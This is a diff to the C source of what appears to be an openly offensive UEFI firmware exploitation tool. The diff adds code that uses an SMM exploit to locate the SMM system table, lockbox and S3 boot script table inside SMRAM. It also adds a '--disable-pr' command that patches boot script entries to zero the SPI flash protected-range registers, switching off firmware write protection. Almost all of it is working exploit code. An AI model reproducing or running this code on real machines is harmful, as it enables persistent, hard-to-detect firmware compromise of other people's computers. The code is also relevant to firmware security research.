@@ -33,8 +33,9 @@
 #define SMM_OP_PHYS_PAGE_WRITE  4   // write physical memory from SMM using page table remap
 #define SMM_OP_EXECUTE          5   // execute SMM code at specified physical address
 #define SMM_OP_GET_SMRAM_ADDR   6   // return SMRAM region address
-#define SMM_OP_GET_MEM_INFO     7   // return physical memory information
-#define SMM_OP_TEST             8
+#define SMM_OP_GET_SMST_ADDR    7   // return EFI_SMM_SYSTEM_TABLE2 address
+#define SMM_OP_GET_MEM_INFO     8   // return physical memory information
+#define SMM_OP_TEST             9
 
 // default size for TSEG/HSEG
 #define SMRAM_SIZE 0x800000
@@ -47,6 +48,19 @@
 
 // Top of Upper Usable DRAM
 #define MEM_TOUUD PCI_ADDR(0, 0, 0, 0xa8)
+
+// Root Complex Base Address register address
+#define LPC_RCBA PCI_ADDR(0, 0x1f, 0, 0xf0)
+
+// SPI interface registers offset for RCRB
+#define SPIBAR 0x3800
+
+// SPI protected range registers offsets
+#define PR0 SPIBAR + 0x74
+#define PR1 SPIBAR + 0x78
+#define PR2 SPIBAR + 0x7C
+#define PR3 SPIBAR + 0x80
+#define PR4 SPIBAR + 0x84
 
 typedef void (* SMM_PROC)(void);
 
@@ -88,6 +102,12 @@ typedef struct _SMM_HANDLER_CONTEXT
 
         } smram_addr;
 
+        struct // for SMM_OP_GET_SMST_ADDR
+        {
+            unsigned long long addr;
+
+        } smst_addr;
+
         struct // for SMM_OP_TEST
         {
             unsigned long long val;
@@ -120,6 +140,10 @@ typedef struct _SMM_HANDLER_CONTEXT
 
 // get EPT page-walk length from EPTP
 #define EPT_PAGE_WALK_LEN(_val_) ((((_val_) >> 3) & 7) + 1)
+
+// check for valid SMRAM pointer
+#define IS_SMRAM_PTR(_val_) ((unsigned long long)(_val_) >= TSEG && \
+                             (unsigned long long)(_val_) < TSEG + SMRAM_SIZE)
 
 // number of CPU to run SMM exploit
 static unsigned long m_current_cpu = 0;
@@ -272,6 +296,25 @@ static void smm_handler(void *context)
         handler_context->smram_addr.addr &= ~(unsigned long long)(SMRAM_SIZE - 1);
 
         status = 0;
+    }
+    else if (handler_context->op == SMM_OP_GET_SMST_ADDR)
+    {
+        // calculate SMRAM address by stack pointer value
+        unsigned long long smram_addr = (unsigned long long)&status;
+        smram_addr &= ~(unsigned long long)(SMRAM_SIZE - 1);
+
+        for (int i = 0; i < SMRAM_SIZE - PAGE_SIZE; i += 0x10)
+        {
+            // check for EFI_SMM_SYSTEM_TABLE2 header signature
+            if (*(unsigned int *)(smram_addr + i) == 'TSMS' &&
+                *(unsigned int *)(smram_addr + i + sizeof(int)) == 0)
+            {
+                handler_context->smst_addr.addr = smram_addr + i;
+                status = 0;
+
+                break;
+            }
+        }        
     }
     else if (handler_context->op == SMM_OP_TEST)
     {
@@ -814,6 +857,25 @@ unsigned long long smram_addr(int target, PUEFI_EXPL_TARGET custom_target)
     return 0;
 }
 //--------------------------------------------------------------------------------------
+unsigned long long smst_addr(int target, PUEFI_EXPL_TARGET custom_target)
+{
+    SMM_HANDLER_CONTEXT context;
+    memset(&context, 0, sizeof(context));
+    context.op = SMM_OP_GET_SMST_ADDR;
+
+    // run exploitation to get EFI_SMM_SYSTEM_TABLE2 address
+    if (exploit(target, custom_target, &context, NULL, true) == 0)
+    {
+        return context.smst_addr.addr;
+    }
+    else
+    {
+        printf(__FUNCTION__"() ERROR: exploit() fails\n");
+    }
+
+    return 0;
+}
+//--------------------------------------------------------------------------------------
 bool eptp_info(
     int target, PUEFI_EXPL_TARGET custom_target, 
     unsigned int cpu_num, unsigned long long addr,
@@ -1207,11 +1269,13 @@ int phys_mem_dump(int target, PUEFI_EXPL_TARGET custom_target, const char *file_
 
     if (!uefi_expl_pci_read(MEM_TOUUD, U64, &TOUUD))
     {
+        printf(__FUNCTION__"() ERROR: uefi_expl_pci_read() fails\n");
         goto _end;
     }
 
     if (!uefi_expl_pci_read(MEM_TOLUD, U32, &TOLUD))
     {
+        printf(__FUNCTION__"() ERROR: uefi_expl_pci_read() fails\n");
         goto _end;
     }
 
@@ -1338,6 +1402,396 @@ _end:
     return ret;
 }
 //--------------------------------------------------------------------------------------
+// offset of the EFI_SMM_SYSTEM_TABLE2::NumberOfTableEntries and SmmConfigurationTable
+#define EFI_SMM_SYSTEM_TABLE2_NumberOfTableEntries  0xa8
+#define EFI_SMM_SYSTEM_TABLE2_SmmConfigurationTable 0xb0
+
+typedef struct 
+{
+    GUID VendorGuid;
+    void *VendorTable;
+
+} EFI_CONFIGURATION_TABLE;
+
+unsigned long long configuration_table_addr(int target, PUEFI_EXPL_TARGET custom_target, GUID *guid)
+{
+    unsigned long long ret = 0, table_addr = 0, table_entries = 0;
+
+    // get EFI_SMM_SYSTEM_TABLE2 address
+    unsigned long long smst = smst_addr(target, custom_target);
+    if (smst == 0)
+    {
+        printf(__FUNCTION__"() ERROR: smst_addr() fails\n");
+        return 0;
+    }
+
+    printf("EFI_SMM_SYSTEM_TABLE2 is at 0x%llx\n", smst);
+
+    unsigned long long TSEG = smst & ~(unsigned long long)(SMRAM_SIZE - 1);
+
+    // read NumberOfTableEntries value
+    if (phys_mem_read(
+        target, custom_target, (void *)(smst + EFI_SMM_SYSTEM_TABLE2_NumberOfTableEntries), 
+        sizeof(unsigned long long), (unsigned char *)&table_entries, NULL) != 0)
+    {
+        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+        return 0;
+    }
+
+    if (table_entries > 0x10)
+    {
+        printf(__FUNCTION__"() ERROR: Invalid NumberOfTableEntries value\n");
+        return 0;
+    }
+
+    // read SmmConfigurationTable pointer
+    if (phys_mem_read(
+        target, custom_target, (void *)(smst + EFI_SMM_SYSTEM_TABLE2_SmmConfigurationTable),
+        sizeof(unsigned long long), (unsigned char *)&table_addr, NULL) != 0)
+    {
+        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+        return 0;
+    }    
+
+    if (!IS_SMRAM_PTR(table_addr))
+    {
+        printf(__FUNCTION__"() ERROR: Invalid SmmConfigurationTable value\n");
+        return 0;
+    }
+
+    printf(
+        "UEFI SMM configuration table with %d entries is at 0x%llx\n", 
+        table_entries, table_addr
+    );
+
+    for (unsigned long long i = 0; i < table_entries; i += 1)
+    {
+        EFI_CONFIGURATION_TABLE table_entry;
+
+        // read configuration table entry
+        if (phys_mem_read(
+            target, custom_target, (void *)(table_addr + i * sizeof(EFI_CONFIGURATION_TABLE)),
+            sizeof(EFI_CONFIGURATION_TABLE), (unsigned char *)&table_entry, NULL) != 0)
+        {
+            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+            return 0;
+        }
+
+        // match GUID
+        if (!memcmp(&table_entry.VendorGuid, guid, sizeof(GUID)))
+        {
+            if (!IS_SMRAM_PTR(table_entry.VendorTable))
+            {
+                printf(__FUNCTION__"() ERROR: Invalid VendorTable value\n");
+                return 0;
+            }
+
+            // return vendor specific table address
+            return (unsigned long long)table_entry.VendorTable;
+        }
+    }
+
+    return ret;
+}
+//--------------------------------------------------------------------------------------
+// "LOCKB_64" magic constant
+#define SMM_LOCK_BOX_SIGNATURE_64 0x34365F424B434F4C
+
+#define EFI_SMM_LOCK_BOX_COMMUNICATION_GUID \
+    {0x2a3cfebd, 0x27e8, 0x4d0a, {0x8b, 0x79, 0xd6, 0x88, 0xc2, 0xa3, 0xe1, 0xc0}}
+
+GUID gEfiSmmLockBoxCommunicationGuid[] = EFI_SMM_LOCK_BOX_COMMUNICATION_GUID;
+
+typedef struct
+{
+    unsigned long long Signature;
+    LIST_ENTRY *Link;
+
+} SMM_LOCK_BOX_DATA;
+
+typedef struct 
+{
+    unsigned int Size;
+    unsigned long long Unknown;
+    void *Address;    
+    LIST_ENTRY Link;
+
+} SMM_BOOT_SCRIPT;
+
+int boot_script_table_addr(
+    int target, PUEFI_EXPL_TARGET custom_target, 
+    unsigned long long *addr, unsigned int *size)
+{
+    // get SMRAM address
+    unsigned long long TSEG = smram_addr(target, custom_target);
+    if (TSEG == 0)
+    {
+        printf(__FUNCTION__"() ERROR: smram_addr() fails\n");
+        return -1;
+    }
+
+    printf("SMRAM is at 0x%llx:0x%llx\n", TSEG, TSEG + SMRAM_SIZE - 1);
+
+    // find EFI SMM configuration table that belongs to SMM lockbox
+    unsigned long long lockbox_addr = configuration_table_addr(
+        target, custom_target, 
+        gEfiSmmLockBoxCommunicationGuid
+    );
+    if (lockbox_addr == 0)
+    {
+        printf(__FUNCTION__"() ERROR: Unable to find SMM lockbox configuration entry\n");
+        return -1;
+    }
+
+    printf("SMM lockbox configuration table is at 0x%llx\n", lockbox_addr);
+
+    SMM_LOCK_BOX_DATA lockbox;    
+
+    // read SMM lockbox structure
+    if (phys_mem_read(
+        target, custom_target, (void *)lockbox_addr,
+        sizeof(SMM_LOCK_BOX_DATA), (unsigned char *)&lockbox, NULL) != 0)
+    {
+        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+        return -1;
+    }    
+
+    // check for valid magic constant at the beginning of the lockbox structure
+    if (lockbox.Signature != SMM_LOCK_BOX_SIGNATURE_64)
+    {
+        printf(__FUNCTION__"() ERROR: SMM lockbox signature missmatch\n");
+        return -1;
+    }
+
+    if (!IS_SMRAM_PTR(lockbox.Link))
+    {
+        printf(__FUNCTION__"() ERROR: Invalid Link value\n");
+        return -1;
+    }
+
+    LIST_ENTRY list_entry;
+
+    // read SMM lockbox LIST_ENTRY
+    if (phys_mem_read(
+        target, custom_target, (void *)lockbox.Link,
+        sizeof(LIST_ENTRY), (unsigned char *)&list_entry, NULL) != 0)
+    {
+        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+        return -1;
+    }
+
+    if (!IS_SMRAM_PTR(list_entry.Blink))
+    {
+        printf(__FUNCTION__"() ERROR: Invalid Blink value\n");
+        return -1;
+    }
+
+    SMM_BOOT_SCRIPT bootscript;
+
+    // read boot script table information
+    if (phys_mem_read(
+        target, custom_target, 
+        (void *)((unsigned long long)list_entry.Blink - FIELD_OFFSET(SMM_BOOT_SCRIPT, Link)),
+        sizeof(SMM_BOOT_SCRIPT), (unsigned char *)&bootscript, NULL) != 0)
+    {
+        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+        return -1;
+    }
+
+    if (!IS_SMRAM_PTR(bootscript.Address))
+    {
+        printf(__FUNCTION__"() ERROR: Invalid boot script table address\n");
+        return -1;
+    }
+
+    if (bootscript.Size <= 2 || bootscript.Size > PAGE_SIZE * 10)
+    {
+        printf(__FUNCTION__"() ERROR: Invalid boot script table size\n");
+        return -1;
+    }
+
+    printf(
+        "UEFI boot script table is at 0x%llx (length: 0x%llx bytes)\n", 
+        bootscript.Address, bootscript.Size
+    );
+    
+    unsigned short bootscript_magic = 0;
+
+    // read boot script table signature
+    if (phys_mem_read(
+        target, custom_target, bootscript.Address,
+        sizeof(unsigned short), (unsigned char *)&bootscript_magic, NULL) != 0)
+    {
+        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+        return -1;
+    }
+
+    if (bootscript_magic != 0xAA)
+    {
+        printf(__FUNCTION__"() ERROR: Boot script table signature missmatch\n");
+        return -1;
+    }
+
+    *addr = (unsigned long long)bootscript.Address;
+    *size = bootscript.Size;
+
+    return 0;
+}
+//--------------------------------------------------------------------------------------
+// boot script table opcodes
+#define BOOT_SCRIPT_IO_WRITE_OPCODE                 0x00
+#define BOOT_SCRIPT_IO_READ_WRITE_OPCODE            0x01
+#define BOOT_SCRIPT_MEM_WRITE_OPCODE                0x02
+#define BOOT_SCRIPT_MEM_READ_WRITE_OPCODE           0x03
+#define BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE         0x04
+#define BOOT_SCRIPT_PCI_CONFIG_READ_WRITE_OPCODE    0x05
+#define BOOT_SCRIPT_SMBUS_EXECUTE_OPCODE            0x06
+#define BOOT_SCRIPT_STALL_OPCODE                    0x07
+#define BOOT_SCRIPT_DISPATCH_OPCODE                 0x08
+#define BOOT_SCRIPT_MEM_POLL_OPCODE                 0x09
+
+int disable_PRx(int target, PUEFI_EXPL_TARGET custom_target)
+{
+    int ret = -1;
+    unsigned long long bootscript_addr = 0, RCBA = 0;
+    unsigned int bootscript_size = 0, ptr = 2;
+
+    // get Root Complex Base Address register value
+    if (!uefi_expl_pci_read(LPC_RCBA, U32, &RCBA))
+    {
+        printf(__FUNCTION__"() ERROR: uefi_expl_pci_read() fails\n");
+        goto _end;
+    }
+
+    // get Root Complex Register Block address
+    unsigned long long rcrb_addr = RCBA & 0xffffc000;
+
+    if (rcrb_addr == 0 || rcrb_addr > 0xfffff000)
+    {
+        printf(__FUNCTION__"() ERROR: Invalid RCBA value\n");
+        return -1;
+    }
+
+    printf("Root Complex Register Block is at 0x%llx\n", rcrb_addr);
+
+    // find UEFI boot script table address (points inside SMRAM) and size
+    if (boot_script_table_addr(target, custom_target, &bootscript_addr, &bootscript_size) != 0)
+    {
+        printf(__FUNCTION__"() ERROR: Unable to find UEFI boot script table\n");
+        return -1;
+    }
+
+    // allocate bufer for boot script table entries
+    unsigned char *bootscript = (unsigned char *)malloc(bootscript_size);
+    if (bootscript == NULL)
+    {
+        return -1;
+    }
+
+    // read boot script table entries
+    if (phys_mem_read(
+        target, custom_target, (void *)bootscript_addr, bootscript_size, bootscript, NULL) != 0)
+    {
+        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
+        goto _end;
+    }
+
+    struct
+    {
+        const char *name;
+        unsigned long long addr;
+        bool found;
+
+    } pr_regs[] = { { "PR0", rcrb_addr + PR0, false },
+                    { "PR1", rcrb_addr + PR1, false },
+                    { "PR2", rcrb_addr + PR2, false },
+                    { "PR3", rcrb_addr + PR3, false },
+                    { "PR4", rcrb_addr + PR4, false } };
+
+    int registers_found = 0, entries_patched = 0;
+
+    // enumerate table entries
+    while (ptr < bootscript_size - 2)
+    {
+        unsigned char *entry = bootscript + ptr;
+
+        // get entry size and opcode
+        unsigned char size = *(entry + 0);
+        unsigned char code = *(entry + 1);
+
+        if (size > bootscript_size - ptr)
+        {
+            printf(__FUNCTION__"() ERROR: Invalid boot script table entry size\n");
+            goto _end;
+        }
+
+        // check if boot script table entry performs memory write operation
+        if (code == BOOT_SCRIPT_MEM_WRITE_OPCODE)
+        {
+            // get write address and value arguments
+            unsigned long long addr = *(unsigned long long *)(entry + 0x09);
+            unsigned int val = *(unsigned int *)(entry + 0x11);
+
+            for (int i = 0; i < 5; i += 1)
+            {
+                // determinate if address belongs to PRx register
+                if (addr == pr_regs[i].addr)
+                {
+                    printf(
+                        " * table entry at 0x%llx writes 0x%x to register %s\n",
+                        bootscript_addr + ptr, val, pr_regs[i].name
+                    );
+
+                    val = 0;
+
+                    // patch PRx write value to zero
+                    if (phys_mem_write(
+                        target, custom_target, (void *)(bootscript_addr + ptr + 0x11),
+                        sizeof(unsigned int), (unsigned char *)&val, NULL) == 0)
+                    {
+                        entries_patched += 1;
+                    }
+                    else
+                    {
+                        printf(__FUNCTION__"() ERROR: phys_mem_write() fails\n");
+                    }
+
+                    if (!pr_regs[i].found)
+                    {
+                        registers_found += 1;
+                    }
+
+                    pr_regs[i].found = true;
+                    break;
+                }
+            }
+        }
+
+        // go to the next boot script table entry
+        ptr += size;
+    }
+
+    if (registers_found > 0)
+    {
+        printf("%d UEFI boot script table entries was patched\n", entries_patched);
+
+        ret = 0;
+    }
+    else
+    {
+        printf(__FUNCTION__"() ERROR: Unbale to find boot script table entries that sets PRx\n");
+    }
+
+_end:
+
+    if (bootscript)
+    {
+        free(bootscript);
+    }
+
+    return ret;
+}
+//--------------------------------------------------------------------------------------
 int _tmain(int argc, _TCHAR* argv[])
 {
     int ret = -1, target = -1;
@@ -1347,6 +1801,7 @@ int _tmain(int argc, _TCHAR* argv[])
     bool use_dse_bypass = false, use_test = false;
     bool use_smram_dump = false, use_mem_dump = false;
     bool use_ept_find = false;
+    bool use_disable_pr = false;
     
     SMM_HANDLER_CONTEXT context;
     memset(&context, 0, sizeof(context));
@@ -1424,6 +1879,11 @@ int _tmain(int argc, _TCHAR* argv[])
             }
             
             i += 1;
+        }
+        else if (!strcmp(argv[i], "--disable-pr"))
+        {
+            // disable PRx flash write protection
+            use_disable_pr = true;
         }
         else if (!strcmp(argv[i], "--length") && i < argc - 1)
         {
@@ -1633,6 +2093,11 @@ int _tmain(int argc, _TCHAR* argv[])
                 {
                     // dump EPT tables
                     ret = ept_dump(target, &custom_target, pml4_addr, data_file);
+                }
+                else if (use_disable_pr)
+                {
+                    // disable SPI protected ranges
+                    ret = disable_PRx(target, &custom_target);
                 }
                 else if (use_smram_dump)
                 {
